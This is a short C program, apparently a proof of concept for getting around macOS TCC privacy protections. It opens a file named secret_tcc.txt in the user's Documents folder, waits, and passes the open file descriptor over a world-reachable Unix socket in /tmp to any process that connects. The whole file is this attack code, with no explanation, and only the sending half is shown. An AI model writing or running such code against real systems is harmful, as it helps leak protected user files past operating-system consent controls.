#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/uio.h>
#include <errno.h>

#define SOCKET_PATH "/tmp/φReplay.sock"

void send_fd(int conn_fd, int fd_to_send) {
    struct msghdr msg = {0};
    char buf[1] = { 'F' };
    struct iovec io = { .iov_base = buf, .iov_len = sizeof(buf) };

    char cmsgbuf[CMSG_SPACE(sizeof(int))];
    memset(cmsgbuf, 0, sizeof(cmsgbuf));

    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = cmsgbuf;
    msg.msg_controllen = sizeof(cmsgbuf);

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    memcpy(CMSG_DATA(cmsg), &fd_to_send, sizeof(int));

    if (sendmsg(conn_fd, &msg, 0) == -1) {
        perror("sendmsg");
    } else {
        printf("[φReplay] Sent FD %d to receiver\n", fd_to_send);
    }
}

void cleanup_socket() {
    unlink(SOCKET_PATH);
}

int main() {
    cleanup_socket();

    int server_fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (server_fd == -1) {
        perror("socket");
        return 1;
    }

    struct sockaddr_un addr = {0};
    addr.sun_family = AF_UNIX;
    strncpy(addr.sun_path, SOCKET_PATH, sizeof(addr.sun_path)-1);

    if (bind(server_fd, (struct sockaddr*)&addr, sizeof(addr)) == -1) {
        perror("bind");
        return 1;
    }

    if (listen(server_fd, 1) == -1) {
        perror("listen");
        return 1;
    }

    const char *home = getenv("HOME");
    char path[512];
    snprintf(path, sizeof(path), "%s/Documents/secret_tcc.txt", home);
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    printf("[φReplay] File descriptor %d opened. Sleeping before sending...\n", fd);
    sleep(10); // Delay to simulate idle window

    printf("[φReplay] Ready. Waiting for receiver to connect...\n");
    int client_fd = accept(server_fd, NULL, NULL);
    if (client_fd < 0) {
        perror("accept");
        return 1;
    }

    send_fd(client_fd, fd);
    close(client_fd);
    close(fd);
    close(server_fd);
    cleanup_socket();
    return 0;
}